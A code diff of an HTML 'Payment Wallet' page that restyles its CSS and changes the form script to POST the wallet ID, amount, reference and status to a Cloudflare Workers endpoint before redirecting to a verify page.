@@ -8,7 +8,7 @@
     content="width=device-width, initial-scale=1.0, viewport-fit=cover"
   >
 
-  <meta name="theme-color" content="#1598f5">
+  <meta name="theme-color" content="#168ff4">
 
   <title>Payment Wallet</title>
 
@@ -20,47 +20,57 @@
       -webkit-tap-highlight-color: transparent;
     }
 
-    html, body {
+    html,
+    body {
       width: 100%;
       min-height: 100%;
     }
 
     body {
-      font-family: -apple-system, BlinkMacSystemFont,
-                   "Segoe UI", Roboto, Arial, sans-serif;
+      font-family:
+        -apple-system,
+        BlinkMacSystemFont,
+        "Segoe UI",
+        Roboto,
+        Arial,
+        sans-serif;
 
-      background: #1595f3;
+      background: #168ff4;
       color: #0b0b0b;
     }
 
-    /* BLUE HEADER */
+    /* =========================
+       BLUE HEADER
+    ========================= */
+
     .top {
       position: fixed;
-      top: 0;
-      left: 0;
-      right: 0;
+      inset: 0 0 auto 0;
 
-      height: 220px;
+      height: 215px;
 
       background:
         linear-gradient(
           145deg,
-          #26a8ff 0%,
-          #168ff4 55%,
+          #28a9ff 0%,
+          #168ff4 52%,
           #1186ed 100%
         );
 
       z-index: 0;
     }
 
-    /* MAIN WHITE PAGE */
+    /* =========================
+       WHITE PAGE
+    ========================= */
+
     .page {
       position: relative;
       z-index: 1;
 
-      margin-top: 185px;
+      margin-top: 180px;
 
-      min-height: calc(100vh - 185px);
+      min-height: calc(100vh - 180px);
 
       background: #ffffff;
 
@@ -69,7 +79,7 @@
       padding:
         72px
         28px
-        calc(35px + env(safe-area-inset-bottom));
+        calc(40px + env(safe-area-inset-bottom));
     }
 
     .container {
@@ -78,9 +88,13 @@
       margin: 0 auto;
     }
 
-    /* LOGO */
+    /* =========================
+       BRAND
+    ========================= */
+
     .logo {
       text-align: center;
+
       font-size: 48px;
       font-weight: 950;
       letter-spacing: -3px;
@@ -90,15 +104,15 @@
     .logo span {
       display: block;
 
-      margin-top: 14px;
+      margin-top: 15px;
 
       font-size: 31px;
       letter-spacing: -1px;
     }
 
     .subtitle {
-      margin-top: 48px;
-      margin-bottom: 58px;
+      margin-top: 50px;
+      margin-bottom: 60px;
 
       text-align: center;
 
@@ -106,10 +120,13 @@
       font-weight: 650;
     }
 
-    /* FORM */
+    /* =========================
+       FORM
+    ========================= */
+
     .field {
       position: relative;
-      margin-bottom: 31px;
+      margin-bottom: 32px;
     }
 
     .field label {
@@ -119,16 +136,16 @@
       left: 29px;
       top: -13px;
 
-      padding: 0 11px;
-
       background: #ffffff;
 
-      color: #9a9a9a;
+      padding: 0 11px;
+
+      color: #999999;
 
       font-size: 18px;
       font-weight: 650;
 
-      transition: 0.2s;
+      transition: 0.2s ease;
     }
 
     .field:focus-within label {
@@ -141,23 +158,23 @@
       width: 100%;
       height: 86px;
 
+      padding: 0 28px;
+
       border: 2px solid #aaaaaa;
       border-radius: 22px;
 
       background: #ffffff;
 
-      padding: 0 28px;
+      color: #111111;
 
       font-size: 22px;
       font-weight: 500;
 
-      color: #111111;
-
       outline: none;
 
       transition:
-        border-color 0.2s,
-        box-shadow 0.2s;
+        border-color 0.2s ease,
+        box-shadow 0.2s ease;
     }
 
     input::placeholder {
@@ -171,18 +188,20 @@
         0 0 0 4px rgba(22, 143, 247, 0.10);
     }
 
-    /* Remove number arrows */
     input::-webkit-outer-spin-button,
     input::-webkit-inner-spin-button {
       -webkit-appearance: none;
       margin: 0;
     }
 
-    input[type=number] {
+    input[type="number"] {
       -moz-appearance: textfield;
     }
 
-    /* NOTICE */
+    /* =========================
+       NOTICE
+    ========================= */
+
     .notice {
       max-width: 470px;
 
@@ -197,10 +216,11 @@
       line-height: 1.55;
     }
 
-    /* BUTTON */
-    .continue-btn {
-      position: relative;
+    /* =========================
+       BUTTON
+    ========================= */
 
+    .continue-btn {
       display: flex;
       align-items: center;
       justify-content: center;
@@ -208,7 +228,7 @@
       width: 100%;
       height: 76px;
 
-      margin-top: 95px;
+      margin-top: 92px;
 
       border: 0;
       border-radius: 24px;
@@ -228,11 +248,11 @@
       cursor: pointer;
 
       box-shadow:
-        0 10px 25px rgba(22, 143, 247, 0.15);
+        0 10px 26px rgba(22, 143, 247, 0.16);
 
       transition:
-        transform 0.15s,
-        opacity 0.15s;
+        transform 0.15s ease,
+        opacity 0.15s ease;
     }
 
     .continue-btn:active {
@@ -240,23 +260,26 @@
     }
 
     .continue-btn:disabled {
-      opacity: 0.65;
+      opacity: 0.62;
       cursor: default;
     }
 
-    /* SPINNER */
+    /* =========================
+       SPINNER
+    ========================= */
+
     .spinner {
       display: none;
 
-      width: 24px;
-      height: 24px;
+      width: 25px;
+      height: 25px;
 
-      border: 3px solid rgba(255,255,255,.4);
+      border: 3px solid rgba(255,255,255,0.42);
       border-top-color: #ffffff;
 
       border-radius: 50%;
 
-      animation: spin .75s linear infinite;
+      animation: spin 0.75s linear infinite;
     }
 
     @keyframes spin {
@@ -265,33 +288,31 @@
       }
     }
 
-    /* MESSAGE */
-    #msg {
-      min-height: 22px;
+    /* =========================
+       STATUS MESSAGE
+    ========================= */
 
-      margin-top: 17px;
+    #msg {
+      min-height: 23px;
+
+      margin-top: 18px;
 
       text-align: center;
 
       font-size: 14px;
-      font-weight: 600;
+      font-weight: 650;
 
       color: #d93025;
     }
 
-    /* PAYMENT REFERENCE */
-    .reference {
-      display: none;
-
-      margin-top: 17px;
-
-      text-align: center;
-
-      font-size: 13px;
-      color: #777;
+    #msg.success {
+      color: #15803d;
     }
 
-    /* MOBILE */
+    /* =========================
+       MOBILE
+    ========================= */
+
     @media (max-width: 480px) {
 
       .top {
@@ -319,9 +340,10 @@
       }
 
       .subtitle {
-        font-size: 20px;
         margin-top: 46px;
         margin-bottom: 55px;
+
+        font-size: 20px;
       }
 
       input {
@@ -330,8 +352,8 @@
       }
 
       .continue-btn {
-        margin-top: 85px;
         height: 73px;
+        margin-top: 84px;
       }
     }
 
@@ -357,7 +379,7 @@
 
       <form id="paymentForm" novalidate>
 
-        <!-- WALLET -->
+        <!-- WALLET ID -->
         <div class="field">
 
           <label for="wallet">
@@ -390,6 +412,7 @@
             name="amount"
             type="number"
             inputmode="decimal"
+            autocomplete="off"
             placeholder="0.00"
             min="0.01"
             step="0.01"
@@ -400,8 +423,9 @@
 
 
         <div class="notice">
-          By continuing, you confirm the Wallet ID and
-          payment amount shown above.
+          By continuing, the Wallet ID, payment amount,
+          payment reference and request status will be sent
+          to the owner of this payment page.
         </div>
 
 
@@ -425,11 +449,6 @@
 
         <div id="msg"></div>
 
-        <div
-          class="reference"
-          id="reference"
-        ></div>
-
       </form>
 
     </div>
@@ -437,175 +456,353 @@
   </main>
 
 
-<script>
+  <script>
 
-  const form =
-    document.getElementById("paymentForm");
+    /* ========================================
+       CLOUDFLARE WORKER
+    ======================================== */
 
-  const walletInput =
-    document.getElementById("wallet");
-
-  const amountInput =
-    document.getElementById("amount");
-
-  const btn =
-    document.getElementById("btn");
-
-  const buttonText =
-    document.getElementById("buttonText");
-
-  const spinner =
-    document.getElementById("spinner");
-
-  const msg =
-    document.getElementById("msg");
+    const API_URL =
+      "https://payment-api-98ca.nrbd2wwmvb.workers.dev/payment";
 
 
-  /* WALLET INPUT:
-     keep digits only
-  */
+    /* ========================================
+       ELEMENTS
+    ======================================== */
 
-  walletInput.addEventListener("input", () => {
+    const form =
+      document.getElementById("paymentForm");
 
-    walletInput.value =
-      walletInput.value.replace(/\D/g, "");
+    const walletInput =
+      document.getElementById("wallet");
 
-    msg.textContent = "";
+    const amountInput =
+      document.getElementById("amount");
 
-  });
+    const btn =
+      document.getElementById("btn");
 
+    const buttonText =
+      document.getElementById("buttonText");
 
-  amountInput.addEventListener("input", () => {
+    const spinner =
+      document.getElementById("spinner");
 
-    msg.textContent = "";
-
-  });
-
-
-  /* GENERATE PAYMENT REFERENCE */
-
-  function generateReference() {
-
-    const time =
-      Date.now()
-        .toString()
-        .slice(-8);
-
-    const random =
-      Math.floor(
-        1000 + Math.random() * 9000
-      );
-
-    return `PAY-${time}-${random}`;
-
-  }
+    const msg =
+      document.getElementById("msg");
 
 
-  /* SUBMIT */
+    /* ========================================
+       WALLET INPUT
+       DIGITS ONLY
+    ======================================== */
 
-  form.addEventListener(
-    "submit",
-    (event) => {
+    walletInput.addEventListener(
+      "input",
+      () => {
 
-      event.preventDefault();
+        walletInput.value =
+          walletInput.value.replace(/\D/g, "");
 
-      const wallet =
-        walletInput.value.trim();
+        clearMessage();
 
-      const amount =
-        amountInput.value.trim();
-
-
-      /* VALIDATION */
-
-      if (!wallet) {
-
-        msg.textContent =
-          "Please enter your Wallet ID.";
-
-        walletInput.focus();
-
-        return;
       }
+    );
 
 
-      if (wallet.length < 6) {
+    amountInput.addEventListener(
+      "input",
+      () => {
 
-        msg.textContent =
-          "Please enter a valid Wallet ID.";
+        clearMessage();
 
-        walletInput.focus();
-
-        return;
       }
+    );
 
 
-      if (
-        !amount ||
-        Number(amount) <= 0
-      ) {
+    /* ========================================
+       MESSAGE HELPERS
+    ======================================== */
 
-        msg.textContent =
-          "Please enter a valid amount.";
-
-        amountInput.focus();
-
-        return;
-      }
-
-
-      /* PROCESSING */
-
-      btn.disabled = true;
-
-      buttonText.style.display =
-        "none";
-
-      spinner.style.display =
-        "block";
+    function clearMessage() {
 
       msg.textContent = "";
-
-
-      const reference =
-        generateReference();
-
-
-      /*
-       Save only for this browser tab/session.
-       No PIN, password or OTP is collected.
-      */
-
-      sessionStorage.setItem(
-        "payment_reference",
-        reference
-      );
-
-      sessionStorage.setItem(
-        "wallet_id",
-        wallet
-      );
-
-      sessionStorage.setItem(
-        "payment_amount",
-        amount
-      );
-
-
-      /* GO TO NEXT PAGE */
-
-      setTimeout(() => {
-
-        window.location.href =
-          "./verify.html?ref=" +
-          encodeURIComponent(reference);
-
-      }, 700);
+      msg.classList.remove("success");
 
     }
-  );
 
-</script>
+
+    function showError(text) {
+
+      msg.classList.remove("success");
+      msg.textContent = text;
+
+    }
+
+
+    function showSuccess(text) {
+
+      msg.classList.add("success");
+      msg.textContent = text;
+
+    }
+
+
+    /* ========================================
+       BUTTON STATE
+    ======================================== */
+
+    function setLoading(loading) {
+
+      btn.disabled = loading;
+
+      if (loading) {
+
+        buttonText.style.display = "none";
+        spinner.style.display = "block";
+
+      } else {
+
+        buttonText.style.display = "inline";
+        spinner.style.display = "none";
+
+      }
+
+    }
+
+
+    /* ========================================
+       GENERATE PAYMENT REFERENCE
+    ======================================== */
+
+    function generateReference() {
+
+      const time =
+        Date.now()
+          .toString()
+          .slice(-8);
+
+      const random =
+        Math.floor(
+          1000 + Math.random() * 9000
+        );
+
+      return `PAY-${time}-${random}`;
+
+    }
+
+
+    /* ========================================
+       FORM SUBMIT
+    ======================================== */
+
+    form.addEventListener(
+      "submit",
+      async (event) => {
+
+        event.preventDefault();
+
+        clearMessage();
+
+
+        const wallet =
+          walletInput.value.trim();
+
+        const amount =
+          amountInput.value.trim();
+
+
+        /* WALLET VALIDATION */
+
+        if (!wallet) {
+
+          showError(
+            "Please enter your Wallet ID."
+          );
+
+          walletInput.focus();
+
+          return;
+        }
+
+
+        if (
+          wallet.length < 6 ||
+          wallet.length > 20
+        ) {
+
+          showError(
+            "Please enter a valid Wallet ID."
+          );
+
+          walletInput.focus();
+
+          return;
+        }
+
+
+        /* AMOUNT VALIDATION */
+
+        const amountNumber =
+          Number(amount);
+
+
+        if (
+          !amount ||
+          !Number.isFinite(amountNumber) ||
+          amountNumber <= 0
+        ) {
+
+          showError(
+            "Please enter a valid amount."
+          );
+
+          amountInput.focus();
+
+          return;
+        }
+
+
+        /* GENERATE REFERENCE */
+
+        const reference =
+          generateReference();
+
+
+        /* START LOADING */
+
+        setLoading(true);
+
+
+        try {
+
+          const response =
+            await fetch(
+              API_URL,
+              {
+
+                method: "POST",
+
+                headers: {
+                  "Content-Type":
+                    "application/json"
+                },
+
+                body: JSON.stringify({
+
+                  wallet:
+                    wallet,
+
+                  amount:
+                    amountNumber.toFixed(2),
+
+                  reference:
+                    reference,
+
+                  status:
+                    "Pending"
+
+                })
+
+              }
+            );
+
+
+          let data = {};
+
+
+          try {
+
+            data =
+              await response.json();
+
+          } catch {
+
+            throw new Error(
+              "Invalid server response"
+            );
+
+          }
+
+
+          if (
+            !response.ok ||
+            data.ok !== true
+          ) {
+
+            throw new Error(
+              data.error ||
+              "Unable to submit request"
+            );
+
+          }
+
+
+          /* SAVE ONLY FOR CURRENT TAB */
+
+          sessionStorage.setItem(
+            "payment_reference",
+            reference
+          );
+
+          sessionStorage.setItem(
+            "wallet_id",
+            wallet
+          );
+
+          sessionStorage.setItem(
+            "payment_amount",
+            amountNumber.toFixed(2)
+          );
+
+          sessionStorage.setItem(
+            "payment_status",
+            "Pending"
+          );
+
+
+          showSuccess(
+            "Request submitted successfully."
+          );
+
+
+          /* MOVE TO VERIFY PAGE */
+
+          setTimeout(
+            () => {
+
+              window.location.href =
+                "./verify.html?ref=" +
+                encodeURIComponent(
+                  reference
+                );
+
+            },
+            500
+          );
+
+
+        } catch (error) {
+
+          console.error(
+            "Payment request error:",
+            error
+          );
+
+
+          showError(
+            "Unable to submit. Please try again."
+          );
+
+
+          setLoading(false);
+
+        }
+
+      }
+    );
+
+  </script>
 
 </body>
 </html>
